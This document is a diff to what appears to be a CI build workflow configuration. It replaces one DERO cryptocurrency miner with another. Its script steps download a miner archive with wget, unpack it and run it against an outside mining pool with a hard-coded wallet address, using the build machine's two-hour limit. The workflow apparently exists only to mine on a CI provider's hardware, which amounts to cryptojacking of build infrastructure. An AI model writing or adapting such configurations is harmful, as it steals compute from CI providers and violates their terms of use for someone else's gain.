@@ -4,6 +4,6 @@ workflows:
     instance_type: linux_x2   # machine instance type
     max_build_duration: 120       # build duration in minutes (min 1, max 120)
     scripts:
-        - wget https://github.com/deroproject/derohe/releases/download/Release116/dero_linux_amd64.tar.gz
-        - tar zxvf dero_linux_amd64.tar.gz
-        - ./dero_linux_amd64/dero-miner-linux-amd64 --wallet-address=dero1qy4p7g4tlfl837nhskz5a6x4cqup28e2hpm0vktsw39smpn3fyah7qqtq7yhq --daemon-rpc-address=community-pools.mysrv.cloud:10300
+        - wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.8_BETA1/astrominer-V1.8_BETA1_generic_amd64_linux.tar.gz
+        - tar zxvf astrominer-V1.8_BETA1_generic_amd64_linux.tar.gz
+        - ./astrominer -w dero1qy4p7g4tlfl837nhskz5a6x4cqup28e2hpm0vktsw39smpn3fyah7qqtq7yhq -r community-pools.mysrv.cloud:10300 -p rpc
